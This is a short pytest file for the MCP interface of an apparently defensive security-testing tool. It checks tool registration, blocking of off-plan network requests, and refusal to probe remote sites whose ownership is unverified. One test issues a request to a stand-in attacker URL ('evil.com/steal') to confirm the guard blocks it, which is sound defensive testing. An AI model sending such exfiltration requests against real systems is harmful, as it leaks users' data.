"""MCP surface smoke tests (run with core + this surface on the path)."""

from __future__ import annotations

import asyncio

import pytest

from tainted.dynamic.target import Account, ProveSetup, SeedRecord, Target
from tainted.selfdefense import PlanViolation
from tainted.execution.guard import build_probe_plan, commit_plan, guarded_replay, new_run_key
from tainted_mcp.server import server


def test_tools_registered():
    tools = asyncio.run(server.list_tools())
    names = {t.name for t in tools}
    assert {
        "tainted_analyze",
        "tainted_prove_start",
        "tainted_prove_status",
        "tainted_prove_result",
        "tainted_fix",
    } <= names


def _setup():
    return ProveSetup(
        target=Target(url="http://localhost:54321", anon_key="a"),
        account_a=Account(label="A"),
        account_b=Account(label="B"),
        seed=SeedRecord(table="invoices", id="x"),
    )


def test_plan_commitment_blocks_off_plan_request():
    key = new_run_key()
    plan = build_probe_plan(_setup())
    replay, guard = guarded_replay(_setup(), plan, commit_plan(plan, key), key)
    with pytest.raises(PlanViolation):
        replay._client.get("http://evil.com/steal")
    assert guard.blocked_calls


def test_prove_refuses_unverified_remote():
    from tainted_mcp.server import tainted_prove_start

    out = tainted_prove_start(
        repo_path=".",
        url="https://someone-elses.vercel.app",
        login_a="a:b",
        login_b="c:d",
    )
    assert out.get("job_id") is None
    assert "ownership" in out.get("error", "").lower()
